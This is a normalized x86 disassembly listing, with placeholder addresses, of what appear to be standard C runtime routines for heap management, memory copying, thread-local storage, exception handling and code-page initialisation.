push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_40e8d6
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_40f1d6
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b9df
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_40e940
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_40ba01
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b8e3
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
mov eax edi
pop edi
leave
retn
push esi
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
pop esi
call sub_40d694
test eax eax
je r-xdata
call sub_40d694
mov [ eax ] esi
sub_40ba40
push 0xc
push r--data
call sub_40c69c
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40c6e1
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_40e8d6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40ea02
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_40d694
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d659
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ba96
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_40ea2d
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_40bace
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40bb55
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_40bb55
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_40bace
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_40bc4c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
lea eax [ ebp - 0x4 ]
inc esi
xor ebx ebx
push eax
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
call sub_40c45e
cmp [ ebp - 0x4 ] 0x5
pop ecx
jle r-xdata
push edi
push ebx
call [ GetModuleHandleA@IAT ]
mov esi [ eax + 0x3c ]
add esi eax
cmp [ esi + 0x6 ] bx
movzx eax [ esi + 0x14 ]
lea edi [ eax + esi + 0x18 ]
jbe r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
push edi
push r--data
call sub_40d810
test eax eax
pop ecx
pop ecx
je r-xdata
pop esi
pop ebx
leave
retn
and [ ebp - 0x8 ] 0x0
movzx eax [ esi + 0x6 ]
inc ebx
add edi 0x28
cmp ebx eax
jb r-xdata
jmp r-xdata
sub_40bcb8
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
call sub_40bc4c
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
mov eax [ eax + 0x1f8 ]
jmp r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
test eax eax
je r-xdata
sub_40bd2f
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
call sub_40bc4c
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
mov eax [ eax + 0x1fc ]
jmp r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
test eax eax
je r-xdata
sub_40bda6
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_40bd2f
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_40bdd8
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_40bd2f
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_40e7a9
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_40be15
push 0xc
push r--data
call sub_40c69c
push r--data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] rw-data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov eax rw-data
mov [ esi + 0x68 ] eax
push eax
call [ InterlockedIncrement@IAT ]
push 0xc
call sub_40e8d6
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
call sub_40bc4c
test eax eax
je r-xdata
push [ esi + 0x6c ]
call sub_40d093
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40becb
call sub_40c6e1
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
push r--data
push [ ebp - 0x1c ]
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
sub_40bed4
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_40bda6
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40c248
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_40bd2f
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_40ba40
pop ecx
xor esi esi
push 0x0
push esi
call sub_40be15
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40bf63
push 0x8
push r--data
call sub_40c69c
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40c6e1
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_40ba40
pop ecx
mov eax [ esi + 0x5c ]
cmp eax rw-data
je r-xdata
push eax
call sub_40ba40
pop ecx
push 0xd
call sub_40e8d6
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_40ba40
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c06f
push 0xc
call sub_40e8d6
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c07b
push esi
call sub_40ba40
pop ecx
push edi
call sub_40d119
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_40ba40
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_40cf53
pop ecx
sub_40c084
push edi
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_40bdd8
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_40bd9d
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c64e
push [ rw-data ]
call sub_40bcb8
push [ rw-data ]
mov [ rw-data ] eax
call sub_40bcb8
push [ rw-data ]
mov [ rw-data ] eax
call sub_40bcb8
push [ rw-data ]
mov [ rw-data ] eax
call sub_40bcb8
add esp 0x10
mov [ rw-data ] eax
call sub_40e760
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_40bdd8
push sub_40bf63
push [ rw-data ]
call sub_40bd2f
pop ecx
call eax
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push 0x214
push 0x1
call sub_40c248
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_40bd2f
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_40be15
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_40c208
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0xc ]
call sub_40d9e0
mov edi eax
test edi edi
pop ecx
jne r-xdata
sub_40c248
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40b8e3
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40c290
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ esp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40f6a0
mov edi eax
test edi edi
pop ecx
pop ecx
jne r-xdata
sub_40c2db
push 0x10
push r--data
call sub_40c69c
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_40d694
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40f5bf
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_40e8d6
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_40ea02
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_40c6e1
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c375
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_40c407
push esi
mov esi [ esp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ esp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_40c427
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call sub_40d694
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40f5bf
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov [ ecx ] eax
xor eax eax
pop esi
retn
sub_40c45e
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
call sub_40d694
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40f5bf
add esp 0x14
push 0x16
pop eax
pop esi
retn
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
sub_40c49a
cmp [ r--data ] 0x0
je r-xdata
call sub_40f8bb
push r--data
push r--data
call sub_40c407
test eax eax
pop ecx
pop ecx
jne r-xdata
push r--data
call sub_40f960
test eax eax
pop ecx
je r-xdata
retn
push esi
push edi
push sub_40e5f3
call sub_40aff9
mov esi r--data
mov eax esi
mov edi r--data
cmp eax edi
pop ecx
jae r-xdata
push [ esp + 0x4 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_40f960
test eax eax
pop ecx
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_40c52c
push 0x10
push r--data
call sub_40c69c
push 0x8
call sub_40e8d6
pop ecx
xor edi edi
mov [ ebp - 0x4 ] edi
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c5f9
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] edi
jne r-xdata
call sub_40c6e1
retn
mov [ rw-data ] ebx
push 0x8
call sub_40e7fe
pop ecx
push [ ebp + 0x8 ]
call sub_40c3c8
push r--data
mov eax r--data
call sub_40c3ef
pop ecx
push [ rw-data ]
call sub_40bd2f
mov [ ebp - 0x1c ] eax
push [ rw-data ]
call sub_40bd2f
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x20 ] esi
cmp [ ebp - 0x1c ] edi
je r-xdata
push r--data
mov eax r--data
call sub_40c3ef
pop ecx
sub esi 0x4
mov [ ebp - 0x20 ] esi
cmp esi [ ebp - 0x1c ]
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edi [ esi ]
call sub_40bd26
cmp edi eax
je r-xdata
push edi
call sub_40bd2f
pop ecx
call eax
jmp r-xdata
sub_40c64e
push esi
call sub_40bd26
mov esi eax
push esi
call sub_40e907
push esi
call sub_40fc39
push esi
call sub_40f4b9
push esi
call sub_40fc2f
push esi
call sub_40fc25
push esi
call sub_40fa1b
push esi
call sub_41128c
push esi
call sub_40d91b
push sub_40c61f
call sub_40bcb8
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_40c69c
push sub_40c700
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_40c700
sub esp 0x14
push ebx
mov ebx [ esp + 0x20 ]
push ebp
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
cmp eax 0xfffffffe
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x18 ] 0x1
lea edi [ ebx + 0x10 ]
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40fd18
mov eax [ esp + 0x28 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40fd18
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov ebp [ ebx + 0xc ]
cmp ebp 0xfffffffe
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
mov [ ebx - 0x4 ] edx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push rw-data
push edi
mov ecx ebx
mov edx 0xfffffffe
call sub_40fe64
jmp r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
test ecx ecx
lea ebx [ esi + eax * 4 + 0x10 ]
mov eax [ ebx ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xfffffffe
mov ebp eax
jne r-xdata
mov edx edi
call sub_40fe1a
test eax eax
mov [ esp + 0x13 ] 0x1
jl r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40fd18
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40fd18
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ esp + 0x28 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x2c ]
call sub_40fe4a
mov eax [ esp + 0x2c ]
cmp [ eax + 0xc ] ebp
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebp
mov ecx eax
call sub_40fe64
mov eax [ esp + 0x2c ]
push r--data
call sub_40f960
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40fd18
mov ecx [ ebx + 0x8 ]
mov edx edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40fd18
mov edx [ esp + 0x28 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_410d91
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40c896
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40c8c5
push ebx
push ebp
push esi
push edi
mov ebp 0x101
mov esi eax
push ebp
xor edi edi
lea ebx [ esi + 0x1c ]
push edi
push ebx
call sub_40e940
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
xor eax eax
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax rw-data
add esp 0xc
sub eax esi
mov cl [ eax + ebx ]
mov [ ebx ] cl
inc ebx
dec ebp
jne r-xdata
lea ecx [ esi + 0x11d ]
mov esi 0x100
mov dl [ ecx + eax ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_40c91a
push ebp
lea ebp [ esp - 0x49c ]
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x498 ] eax
push ebx
push edi
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
mov edi 0x100
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x80 ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x80 ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax + 0x398 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x76 ]
test al al
mov [ ebp + 0x398 ] 0x20
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x68 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x1
push 0x0
call sub_410033
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x298 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40d616
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x198 ]
push edi
push eax
push edi
lea eax [ ebp + 0x398 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40d616
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x75 ]
mov edx [ ebp - 0x80 ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp + 0x498 ]
pop edi
xor ecx ebp
pop ebx
call sub_40fd18
add ebp 0x49c
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax + 0x298 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx + 0x398 ]
push 0x20
push edx
call sub_40e940
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax + 0x198 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x68 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_40caa4
push 0xc
push r--data
call sub_40c69c
call sub_40bf4b
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40e8d6
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40cb3f
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_40c6e1
retn
push 0x20
call sub_40c37e
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_40ba40
pop ecx
sub_40cb48
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40b00b
cmp esi 0xfffffffe
mov [ rw-data ] ebx
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40cbc2
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40cb48
mov edi eax
xor esi esi
cmp edi esi
mov [ ebp + 0x8 ] edi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40c8c5
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40e940
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
